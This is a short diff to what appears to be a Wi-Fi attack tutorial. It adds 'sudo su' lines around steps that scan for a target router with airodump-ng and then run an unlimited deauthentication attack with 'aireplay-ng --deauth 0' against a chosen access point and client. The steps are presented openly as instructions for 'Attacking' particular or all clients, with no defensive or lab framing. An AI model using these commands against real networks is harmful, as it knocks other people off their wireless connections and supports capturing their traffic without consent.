@@ -43,6 +43,8 @@ Run the above commands one-by-one only.
 #### Step 2 : Searching your targeted Wi-Fi network/router
 Now run the following commands :  
 ```
+sudo su
+
 airodump-ng wlan0mon
 
 - - -ctrl + C to stop
@@ -75,7 +77,7 @@ airodump-ng -c_ -d "__BSS-ID__" wlan0mon
 #### Step 4 : Attacking (on particular Client // on all Clients)
 Now open new terminal tab and run the following commands :  
 ```
-sudo
+sudo su
 
 
 aireplay-ng --deauth 0 -a "___BSS-ID___" -c "__STATION__" wlan0mon
